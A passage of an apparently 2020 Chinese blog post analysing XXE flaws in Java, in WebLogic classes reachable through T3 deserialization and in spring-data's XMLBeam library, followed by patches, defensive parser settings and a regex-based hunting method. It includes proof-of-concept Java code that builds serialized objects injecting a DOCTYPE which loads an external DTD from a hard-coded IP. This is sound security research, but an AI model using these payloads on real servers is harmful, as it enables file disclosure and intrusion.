+            f.setAccessible(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);
+            f.set(frc,xid);
+            Field f1 </span>= frc.getClass().getDeclaredField("epr"<span style="color: #000000;">);
+            f1.setAccessible(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);
+            f1.set(frc, </span><span style="color: #0000ff;">new</span><span style="color: #000000;"> MyEndpointReference());
+            Field f2 </span>= frc.getClass().getDeclaredField("version"<span style="color: #000000;">);
+            f2.setAccessible(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);
+            f2.set(frc,v);
+        }</span><span style="color: #0000ff;">catch</span><span style="color: #000000;">(Exception e){
+            e.printStackTrace();
+        }
+        </span><span style="color: #0000ff;">return</span><span style="color: #000000;"> frc;
+    }
+}</span></pre>
+</div>
+<p>　　先看看其writeExternal方法，箭头所指之处就是构造payload的关键之处，this.epr是抽象类EndpointReference的对象，所以这里其定义的write函数肯定要被其子类实现，那么这里实际上是将结果写入到var2中，那么poc中只需要继承EndpointReference并读取我们的xml payload写入到var2中即可，之后将通过var1写入到序列化数据中</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200323223733052-4458916.png" alt="" width="697" height="255"></p>
+<p>　　那么在其反序列化过程中调用readExternal将通过readFrom方法读取我们的xml payload，接下来就是一大段初始化的过程，直到加载javax.xml.ws.spi.Provider后调用其readEndpointReference来对xml数据流进行读取</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200323225256653-780674267.png" alt="" width="1190" height="77"></p>
+<p>　　从ForeignRecoveryContext的readExternal到漏洞触发点部分调用栈如下图所示：　　</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328145910516-1639126125.png" alt="" width="638" height="152"></p>
+<p>　　接下来就到了xxe的触发点，这里解析xml的类也与之前分析的三个cve不同，这里的Unmarshaller 类将 XML 数据反序列化解析为java对象，然而这里并未添加任何防护措施，因此导致可以注入外部实体，从而产生xxe</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200323232908722-674005907.png" alt="" width="1251" height="162"></p>
+<p>　　第五处存在于Oracle/Middleware/wlserver_10.3/server/lib/weblogic.jar下的weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor类，在该类的load函数中存在使用DocumentBuilderFactory进行xml解析，然后该工厂类是weblogic实现的子类，其中根据本地的配置weblogic.xml.jaxp.allow.externalDTD的值来选择是否设置以下两条featue来限制外部实体的加载,然而默认情况下可以加载外部实体，因此这两条feature失效</p>
+<div class="cnblogs_code">
+<pre>                <span style="color: #0000ff;">this</span>.delegate.setAttribute("http://xml.org/sax/features/external-general-entities"<span style="color: #000000;">, allow_external_dtd);
+                </span><span style="color: #0000ff;">this</span>.delegate.setAttribute("http://xml.org/sax/features/external-parameter-entities", allow_external_dtd);</pre>
+</div>
+<p>从weblogic输入流处理到反序列化入口的过程部分调用栈如下图所示：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328155650821-1905109515.png" alt=""></p>
+<p>&nbsp;在其load函数中只需控制var4即可，其为输入流可本地构造</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200324175219715-79618319.png" alt="" width="941" height="259"></p>
+<p>&nbsp;那么只需要找到在何处调用了load方法即可，可以看到在其反序列化时调用的readExternal中将调用load方法，并且从数据流走向可以判断parse解析的入口参数是可控的</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200324175925351-2073855079.png" alt="" width="837" height="117"></p>
+<p>那么只需要按照writeExternal的逻辑构造序列化数据即可，其调用toString来传入EJBTaglibDescriptor的实例</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200324184044983-506112948.png" alt="" width="771" height="86"></p>
+<p>在tostring方法中又调用该实例的toxml来将程序原来想要输出的数据输出到xmlwriter中并最终返回一个xml字符串输出为序列化数据，其中xmlwriter的println方法是真正负责写入数据的，其写入的即为xml数据</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200324192221635-322290596.png" alt="" width="602" height="253"></p>
+<p>那么我们选择直接控制写入xmlwriter的数据即可</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200324193013094-2028188301.png" alt="" width="738" height="219"></p>
+<p>&nbsp;重写toxml如下：</p>
+<div class="cnblogs_code">
+<pre>  <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">void</span><span style="color: #000000;"> toXML(XMLWriter var1) {
+        var1.println(</span>"&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n" +
+                "&lt;!DOCTYPE data SYSTEM \"http://192.168.3.199:8989/1.dtd\" [\n" +
+                "        &lt;!ELEMENT data (#PCDATA)&gt;\n" +
+                "        ]&gt;\n" +
+                "&lt;data&gt;data&lt;/data&gt;"<span style="color: #000000;">);
+    }
+}</span></pre>
+</div>
+<p>然后本地覆盖原生EJBTaglibDescriptorc.class即可</p>
+<p>poc:</p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">import</span><span style="color: #000000;"> weblogic.servlet.ejb2jsp.dd.EJBTaglibDescriptor;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.FileOutputStream;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.IOException;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> java.io.ObjectOutputStream;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> weblogicxxe5 {
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span> <span style="color: #0000ff;">void</span> main(String[] args) <span style="color: #0000ff;">throws</span><span style="color: #000000;"> IOException {
+        Object instance </span>=<span style="color: #000000;"> getObject();
+        ObjectOutputStream out </span>= <span style="color: #0000ff;">new</span> ObjectOutputStream(<span style="color: #0000ff;">new</span> FileOutputStream("xxe3"<span style="color: #000000;">));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span><span style="color: #000000;"> Object getObject() {
+        EJBTaglibDescriptor umh </span>= <span style="color: #0000ff;">new</span><span style="color: #000000;"> EJBTaglibDescriptor();
+        </span><span style="color: #0000ff;">return</span><span style="color: #000000;"> umh;
+    }
+}</span></pre>
+</div>
+<h3>2.2 代码层面修复</h3>
+<p>那么weblogic的这几个xxe都要多亏与T3协议的助攻，只需要在weblogic类加载路径中可以利用的类，只需要本地构造好payload，然后将序列化的数据以T3协议格式发送至其7001端口即可，那么weblogic在更新的补丁中，也针对这些类添加了相应的feature禁掉了外部实体，从而防止进行xxe攻击</p>
+<div class="cnblogs_code">
+<pre>http:<span style="color: #008000;">//</span><span style="color: #008000;">xml.org/sax/features/external-general-entities</span>
+http:<span style="color: #008000;">//</span><span style="color: #008000;">xml.org/sax/features/external-parameter-entities</span>
+http:<span style="color: #008000;">//</span><span style="color: #008000;">apache.org/xml/features/nonvalidating/load-external-dtd</span></pre>
+</div>
+<p>并且通过以下属性禁用掉了xinclude并关掉了外部实体引用</p>
+<div class="cnblogs_code">
+<pre>setXIncludeAware(<span style="color: #0000ff;">false</span><span style="color: #000000;">)
+setExpandEntityReferences(</span><span style="color: #0000ff;">false</span>)</pre>
+</div>
+<h3>2.3 如何避免xxe</h3>
+<p>　　2.2中从代码层面上单个点添加代码，实际上这种方法只是单纯防御了这几个类，如果在后续的开发中加入新的jar包中存在类有未添加feature的xml解析操作，并且能够进行xml操作的类可以进行序列化，那么仍然面临着导致xxe的风险。T3协议是非常重要的WebLogic内部的通讯协议，若直接禁用T3协议则有可能影响到正常业务运行，那么可以在weblogic控制台的筛选器配置中设置连接筛选器规则进行白名单限制，选择weblogic.security.net.ConnectionFilterImpl，将允许的IP地址或网段设置为allow，然后将除此之外的所有IP地址或网段设置为deny。</p>
+<h2>3.spring-data-XMLBeam XXE</h2>
+<h3>3.1 漏洞点分析&nbsp; &nbsp;&nbsp;</h3>
+<p>该洞主要xmlbeam这个库的问题，而spring-data-commons又使用了xmlbeam来处理客户端传输的xml文件，解析其内容然后服务端响应返回，那么在解析xml中默认允许加载外部实体，从而导致xxe，属于有回显xxe，部分调用栈如下图所示，其中由Streaminput的readDocument进入xml数据的解析</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328175712401-1189095804.png" alt="" width="1019" height="369"></p>
+<p>&nbsp;</p>
+<p>又是熟悉的DocumentBuilder，可以看到在创建解析工厂以及调用parse解析之间并未添加任何feature来限制外部实体</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328175929590-1720926495.png" alt="" width="872" height="200"></p>
+<p>pom依赖：</p>
+<div class="cnblogs_code">
+<pre>        &lt;dependency&gt;
+            &lt;groupId&gt;org.xmlbeam&lt;/groupId&gt;
+            &lt;artifactId&gt;xmlprojector&lt;/artifactId&gt;
+            &lt;version&gt;1.4.13&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.springframework.data&lt;/groupId&gt;
+            &lt;artifactId&gt;spring-data-commons&lt;/artifactId&gt;
+            &lt;version&gt;2.0.5.RELEASE&lt;/version&gt;
+        &lt;/dependency&gt;</pre>
+</div>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319162141630-508969711.png" alt="" width="606" height="263"></p>
+<h3>3.2 代码层面修复</h3>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319162323641-721560469.png" alt="" width="1007" height="225"></p>
+<p>xmlbeam用的为<span class="n">DocumentBuilderFactory来创建dom工厂，修复的为xmlbeam的处理xml的处理文件，修复后主要为设置一些features，用于禁止外部实体的加载，另外还添加了禁止内联 DocTypeDtd的加载，feature通过dom工厂的setFeature函数进行设置</span></p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319162717026-1453006329.png" alt="" width="941" height="297"></p>
+<p>&nbsp;本质处理流程没问题，只是处理前需要做一些防护措施，对于不需要的功能直接禁用掉</p>
+<h3>3.3 如何避免xxe</h3>
+<p>　　对于1.4.15版本之前未升级的xmlxbeam库，我们可自己在创建xml解析工厂类实例后为其设置feature禁用掉外部实体或者直接升级依赖版本到1.4.15以后。</p>
+<h1>0x03 JAVA中XXE 挖掘</h1>
+<p><span lang="EN-US">　　java中解析<span lang="EN-US">xml的库众多，那么白盒中可以通过正则匹配导入相应<span lang="EN-US">xml解析库的类，再加以手工检测来判断是否存在，比如正则匹配以下常用库</span></span></span></p>
+<div class="cnblogs_code">
+<pre><span style="color: #000000;">javax.xml.parsers.DocumentBuilderFactory;
+javax.xml.parsers.SAXParser
+javax.xml.transform.TransformerFactory
+javax.xml.validation.Validator
+javax.xml.validation.SchemaFactory
+javax.xml.transform.sax.SAXTransformerFactory
+javax.xml.transform.sax.SAXSource
+org.xml.sax.XMLReader
+org.xml.sax.helpers.XMLReaderFactory
+org.dom4j.io.SAXReader
+org.jdom.input.SAXBuilder
+org.jdom2.input.SAXBuilder
+javax.xml.bind.Unmarshaller
+javax.xml.xpath.XpathExpression
+javax.xml.stream.XMLStreamReader
+org.apache.commons.digester3.Digester</span></pre>
+</div>
+<p align="left">afanti师傅在挖掘weblogic的xxe时即通过匹配可序列化以及利用xml相关解析的库然后手工检测，其项目地址为：<a href="https://github.com/Afant1/JavaSearchTools">https://github.com/Afant1/JavaSearchTools</a>，那么根据工具要求首先要通过jd-jui将jar包中的字节码文件恢复为java文件</p>
+<p align="left"><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328182929088-2062819506.png" alt="" width="520" height="404"></p>
+<p>&nbsp;</p>
+<p>以默认格式保存后即可使用javasearchtools.jar进行源码扫描</p>
+<p>&nbsp;</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328183107368-1998513468.png" alt=""></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;如下图所示该工具内置的正则能够匹配出我们之前分析的几个存在xxe漏洞的文件，当然该工具可能存在误报，只是作为辅助来缩小我们搜索的范围，那么接下来只需手工去扫描出来的类中去逐个确定即可</p>
+<p align="left"><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328182856401-346366251.png" alt=""></p>
+<p align="left">那么该工具判断xxe核心就是如下图所示的两个布尔值</p>
+<p align="left"><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328183750960-603585023.png" alt=""></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;分别是两种正则匹配规则，xml匹配大量内置xml解析库，是否可反序列化去匹配反序列化中的关键字，同时满足这两个条件的类将被筛选<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328183857572-1523041437.png" alt="" width="1172" height="171"></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;<img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200328183910605-840034682.png" alt="" width="809" height="158"></p>
+<p align="left">那么挖掘其他地方的xxe时也可以使用这种正则匹配的方法来辅助检测，比如对于上面分析JavaMelody和xbeam时并不需要类具有序列化的特性，因此灵活根据实际制定匹配规则即可在其他组件的jar包中寻找可能存在xxe的点</p>
+<h1>0x04 总结</h1>
+<p>经过上面的分析，我们能够了解java中xxe的形成原因以及哪些xml处理类默认情况下能够导致xxe，当然还有其它类本文中可能未曾提及，但道理都是相通的，本文中分析的JavaMelody、Weblogic以及xbeam核心问题还是在涉及xml数据解析时引入外部可控的xml数据，但自身并未考虑是否可能产生xxe漏洞，未做到禁用外部实体的防御措施。<a href="https://find-sec-bugs.github.io/">https://find-sec-bugs.github.io/</a>这个网站上也列出了常见的xml处理库的标准防御方法，那么总的来说，基于xxe的防御主要为以下三种：</p>
+<p>1.设置feature为XMLConstants.FEATURE_SECURE_PROCESSING为true</p>
+<p><span style="color: #000000; font-family: 宋体;">这种方法实际上还是会加载外部实体但是会调用<span class="n">SecuritySupport<span class="o">.<span class="na">checkAccess中进行判断，判断中将外部实体的协议和允许的白名单协议进行匹配，因为XMLConstants.FEATURE_SECURE_PROCESSING将设置</span></span></span><code>Property.ACCESS_EXTERNAL_DTD和</code><code>Property.ACCESS_EXTERNAL_SCHEMA两个属性设置为空，而解析节点之前将根据这两个属性来设置fAccessExternalDTD为空，接着解析节点过程中如果加载外部实体为true，所以会进入checkaccess函数里面以fAccessExternalDTD作为白名单协议数组，而其值已经被置空，所以实际上所有协议被禁用，从而以此方式来达到防御xxe，比如效果如下所示</code></span></p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319214858668-269917419.png" alt="" width="1229" height="35"></p>
+<p>2.设置feature的<code class="code. keep-initial-line-feed language-java"><span class="token string">http://apache.org/xml/features/disallow-doctype-decl为true</span></code></p>
+<p>从该feature的字面意思也能猜到设置该值为true实际上禁用了(dtd)文档定义类型，在解析xml文件的过程中解析Doctype时将判断<span class="n">fDisallowDoctype属性是否为true，若为true则直接报错，所以这么设置就</span>彻底杜绝了xxe漏洞，这种方法完全杜绝了所有dtd的声明，包括内部实体</p>
+<p><img src="https://img2020.cnblogs.com/blog/1063309/202003/1063309-20200319223052967-2084886339.png" alt="" width="1292" height="33"></p>
+<p>3.如果想使用内部实体，单纯禁用外部实体则设置以下两个值即可，则不会进行doctype的解析，从而不会报错，xml解析其他实体正常进行</p>
+<div class="cnblogs_code">
+<pre>FEATURE = "http://xml.org/sax/features/external-parameter-entities"<span style="color: #000000;">;
+dbf.setFeature(FEATURE, </span><span style="color: #0000ff;">false</span><span style="color: #000000;">);
+FEATURE </span>= "http://xml.org/sax/features/external-general-entities"<span style="color: #000000;">;
+dbf.setFeature(FEATURE, </span><span style="color: #0000ff;">false</span>);&nbsp;</pre>
+</div>
+<p>参考：</p>
+<p><a href="https://blog.spoock.com/2018/10/23/java-xxe/">https://blog.spoock.com/2018/10/23/java-xxe/</a></p>
+<p><a href="https://www.leadroyal.cn/?p=914">https://www.leadroyal.cn/?p=914</a></p>
+<p><a href="https://www.leadroyal.cn/?p=930">https://www.leadroyal.cn/?p=930</a></p>
+<p><a href="https://find-sec-bugs.github.io/bugs.htm#XXE_DOCUMENT">https://find-sec-bugs.github.io/bugs.htm#XXE_DOCUMENT</a></p>
+<p><a href="https://xz.aliyun.com/t/7105#toc-3">https://xz.aliyun.com/t/7105#toc-3</a></p>
+<p><a href="https://www.cnblogs.com/-zhong/p/11246369.html">https://www.cnblogs.com/-zhong/p/11246369.html</a></p>
+<p><a href="https://paper.seebug.org/906/">https://paper.seebug.org/906/</a>&nbsp; weblogic 多个xxe</p>
+<p><a href="https://blog.csdn.net/he_and/article/details/89843004">https://blog.csdn.net/he_and/article/details/89843004</a></p>
+<p><audio controls="controls" style="display: none;"></audio></p>
+</div>
+<div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date">2020-04-07 20:46</span>&nbsp;
+<a href="https://www.cnblogs.com/tr1ple/">tr1ple</a>&nbsp;
+阅读(<span id="post_view_count">...</span>)&nbsp;
+评论(<span id="post_comment_count">...</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=12522623" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(12522623);return false;">收藏</a></div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script src="https://common.cnblogs.com/highlight/9.12.0/highlight.min.js"></script>
+<script>markdown_highlight();</script>
+<script>
+    var allowComments = true, cb_blogId = 316934, cb_blogApp = 'tr1ple', cb_blogUserGuid = 'f3d76e0f-51aa-e611-845c-ac853d9f53ac';
+    var cb_entryId = 12522623, cb_entryCreatedDate = '2020-04-07 20:46', cb_postType = 1; 
+    loadViewCount(cb_entryId);
+    loadSideColumnAd();
+</script><a name="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<script>
+    var commentManager = new blogCommentManager();
+    commentManager.renderComments(0);
+</script>
+
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+    <div id="ad_t2"></div>
+    <div id="opt_under_post"></div>
+    <script async="async" src="https://www.googletagservices.com/tag/js/gpt.js"></script>
+    <script>
+        var googletag = googletag || {};
+        googletag.cmd = googletag.cmd || [];
+    </script>
+    <script>
+        googletag.cmd.push(function () {
+            googletag.defineSlot("/1090369/C1", [300, 250], "div-gpt-ad-1546353474406-0").addService(googletag.pubads());
+            googletag.defineSlot("/1090369/C2", [468, 60], "div-gpt-ad-1539008685004-0").addService(googletag.pubads());
+            googletag.pubads().enableSingleRequest();
+            googletag.enableServices();
+        });
+    </script>
+    <div id="cnblogs_c1" class="c_ad_block">
+        <div id="div-gpt-ad-1546353474406-0" style="height:250px; width:300px;"></div>
+    </div>
+    <div id="under_post_news"></div>
+    <div id="cnblogs_c2" class="c_ad_block">
+        <div id="div-gpt-ad-1539008685004-0" style="height:60px; width:468px;">
+            <script>
+                if (new Date() >= new Date(2018, 9, 13)) {
+                    googletag.cmd.push(function () { googletag.display("div-gpt-ad-1539008685004-0"); });
+                }
+            </script>
+        </div>
+    </div>
+    <div id="under_post_kb"></div>
+    <div id="HistoryToday" class="c_ad_block"></div>
+    <script type="text/javascript">
+        fixPostBody();
+        deliverBigBanner();
+setTimeout(function() { incrementViewCount(cb_entryId); }, 50);        deliverAdT2();
+        deliverAdC1();
+        deliverAdC2();
+        loadNewsAndKb();
+        loadBlogSignature();
+LoadPostCategoriesTags(cb_blogId, cb_entryId);        LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+        GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+        loadOptUnderPost();
+        GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+    </script>
+</div>
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+<div id="sidebar_news" class="newsItem">
+            <script>loadBlogNews();</script>
+</div>
+
+<div id="sidebar_ad"></div>
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>
+			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+                    <script>loadBlogSideColumn();</script>
+			</div>
+			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		<!--done-->
+Copyright &copy; 2020 tr1ple
+<br /><span id="poweredby">Powered by .NET Core on Kubernetes</span>
+
+
+
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+
+    <div id="page_end_html">
+        <div id="cnzzProtocol"  style="display: none;">
+    <span class="id_cnzz_stat_icon" id='cnzz_stat_icon_1278632453'></span>
+    <script src='https://s19.cnzz.com/z_stat.php?id=1278632453&online=1&show=line' type='text/javascript'></script>
+</div>
+    </div>
+</body>
+</html>
